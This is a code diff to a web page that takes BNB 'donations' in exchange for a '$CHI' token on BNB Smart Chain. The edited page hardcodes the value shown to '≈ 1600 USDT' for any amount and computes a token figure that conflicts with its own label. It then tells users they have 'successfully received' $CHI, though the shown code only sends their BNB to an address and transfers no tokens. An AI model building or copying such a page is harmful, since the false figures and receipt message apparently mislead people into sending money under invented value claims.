@@ -250,19 +250,19 @@
 
         <div class="amount-box">
             <div class="amount-display" id="bnbAmount">0.0010 BNB</div>
-            <div class="usdt-display" id="usdtAmount">≈ 0.64 USDT</div>
-            <div class="chi-display" id="chiAmount">≈ 1,600,000,000 $CHI</div>
+            <div class="usdt-display" id="usdtAmount">≈ 1600 USDT</div>
+            <div class="chi-display" id="chiAmount">≈ 1,600,000 $CHI</div>
         </div>
 
         <!-- 可拖动滑块 -->
-        <input type="range" id="donateSlider" min="0.001" max="0.1" step="0.001" value="0.001">
+        <input type="range" id="donateSlider" min="0.001" max="0.1" step="0.0001" value="0.001">
         <div class="range-labels">
-            <span>0.001</span>
-            <span>0.1</span>
+            <span>0.0010</span>
+            <span>0.1000</span>
         </div>
 
         <div class="note">
-            Min 0.001 BNB, Max 0.1 BNB per wallet
+            Min 0.0010 BNB, Max 0.1000 BNB per wallet
         </div>
 
         <button class="btn" id="confirmBtn" disabled onclick="confirmDonate()">✅ Confirm Donation</button>
@@ -311,7 +311,6 @@
     const receiveAddress   = "0x1867bB04607FaBa07b512C4df08e7a6A71A6E4C4";
     const chiContract      = "0x1867bB04607FaBa07b512C4df08e7a6A71A6E4C4";
     const chiDecimals      = 18;
-    const chiRate          = 1600000000;
     const BSC_CHAIN_ID     = "0x38";
 
     let provider = null;
@@ -322,8 +321,8 @@
     function updateAmount(){
         let val = parseFloat(slider.value);
         bnbDisplay.textContent = val.toFixed(4) + ' BNB';
-        usdtDisplay.textContent = '≈ ' + (val * 640).toFixed(2) + ' USDT';
-        chiDisplay.textContent = '≈ ' + (val * chiRate).toLocaleString() + ' $CHI';
+        usdtDisplay.textContent = '≈ 1600 USDT';
+        chiDisplay.textContent = '≈ ' + Math.round(val * 16000000000).toLocaleString() + ' $CHI';
     }
 
     // 更新钱包UI
@@ -406,7 +405,7 @@
         }
     }
 
-    // 确认捐款 —— 修复：直接弹钱包，不提前查余额
+    // 确认捐款
     async function confirmDonate(){
         if (!account || !signer) return alert("Please connect wallet");
         if (!await switchToBSC()) return;
@@ -414,7 +413,6 @@
         const val = parseFloat(slider.value).toFixed(4);
 
         try {
-            // 直接发起交易，立刻弹钱包
             const tx = await signer.sendTransaction({
                 to: receiveAddress,
                 value: ethers.utils.parseEther(val),
@@ -427,7 +425,7 @@
 
             alert(`Thank you! 🥳
 You have successfully received: 🎉
-${(val * chiRate).toLocaleString()} $CHI`);
+${Math.round(val * 16000000000).toLocaleString()} $CHI`);
 
         } catch (e) {
             alert("Transaction failed or cancelled");
